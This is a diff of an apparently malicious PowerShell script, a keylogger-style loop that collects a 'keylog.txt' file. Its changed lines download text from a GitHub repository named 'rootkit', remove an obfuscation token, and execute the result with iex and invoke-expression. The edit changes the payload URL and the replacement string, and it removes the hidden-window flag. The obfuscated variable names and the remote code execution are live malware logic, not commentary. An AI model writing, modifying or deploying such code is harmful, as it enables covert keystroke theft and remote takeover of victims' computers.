@@ -29,8 +29,8 @@ Start-Process powershell -ArgumentList "-Command", {
         }
         GetFile $logFilePath "keylog.txt"
         if($elapsedTime -eq 0) {
-            [string]$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/temp.txt')};
-            $qweewqq=$nbvccxx.Replace('wererfvx','');
+            [string]$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/main')};
+            $qweewqq=$nbvccxx.Replace('wererfvx','kkk');
             $zxdsxxxxc=iex $qweewqq;
             invoke-expression $zxdsxxxxc
         }
@@ -38,7 +38,7 @@ Start-Process powershell -ArgumentList "-Command", {
         $elapsedTime = (15 + $elapsedTime) % 60
         start-sleep -s 15
     }
-} -windowstyle hidden
+}
 
 Add-Type -TypeDefinition @"
 using System;
